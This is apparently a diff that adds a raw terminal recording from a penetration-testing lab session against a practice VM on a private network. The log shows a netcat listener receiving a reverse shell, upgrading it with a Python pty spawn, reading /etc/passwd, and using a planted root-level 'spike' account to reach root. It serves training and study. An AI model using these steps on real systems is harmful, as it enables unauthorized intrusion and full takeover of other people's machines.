@@ -1,0 +1,121 @@
+Script started on 2020-09-30 10:16:30-03:00 [TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="168" LINES="30"]
+]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# nc -vnlp 1234
+listening on [any] 1234 ...
+connect to [192.168.1.105] from (UNKNOWN) [192.168.1.104] 57592
+Linux ubuntu 5.4.0-48-generic #52~18.04.1-Ubuntu SMP Thu Sep 10 12:50:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 06:16:53 up 46 min,  0 users,  load average: 0.00, 0.02, 0.04
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ 
+$ 
+$ import        python -c 'import pty;pty.spawn("/bin/bash")'
+/bin/sh: 5: python: not found
+$ ^[[A^[[B        
+$ python3 - 'import pty;pty.soab   pawn("/bin/bash")'^[[D^[[D                                            c 'import pty;pty.spow  awn("/bin/bash")'
+www-data@ubuntu:/$ 
+
+www-data@ubuntu:/$ fid nd    spike       su spike        cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
+avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
+cups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+whoopsie:x:112:117::/nonexistent:/bin/false
+kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+saned:x:114:119::/var/lib/saned:/usr/sbin/nologin
+pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin
+gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false
+gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
+raj:x:1000:1000:raj,,,:/home/raj:/bin/bash
+mysql:x:122:128:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:124:65534::/run/sshd:/usr/sbin/nologin
+spike:$1$spike$CxutB1qK2e4GnxLGmlXyJ.:0:0:root:/root:/bin/bash
+www-data@ubuntu:/$ 
+
+www-data@ubuntu:/$ su spike
+su spike
+Password: 13371337
+
+root@ubuntu:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@ubuntu:/# root
+root
+
+
+
+
+
+Command 'root' not found, did you mean:
+
+  command 'roo' from snap roo (2.0.3)
+  command 'toot' from snap toot (0.27.0)
+  command 'rott' from deb rott
+  command 'proot' from deb proot
+  command 'rootv' from deb xawtv
+
+See 'snap info <snapname>' for additional versions.
+
+root@ubuntu:/# 
+root@ubuntu:/# 
+root@ubuntu:/# https://www.exploit-db.com/exploits/41006                                         exit    id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@ubuntu:/# whami   oami
+whoami
+root
+root@ubuntu:/# 
+
+root@ubuntu:/# 
+
+root@ubuntu:/# 
+
+root@ubuntu:/# 
+
+root@ubuntu:/# exit
+exit
+exit
+www-data@ubuntu:/$ exit
+exit
+exit
+$ 
+$ 
+$ exit
+]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# exit
+exit
+
+Script done on 2020-09-30 10:30:58-03:00 [COMMAND_EXIT_CODE="0"]
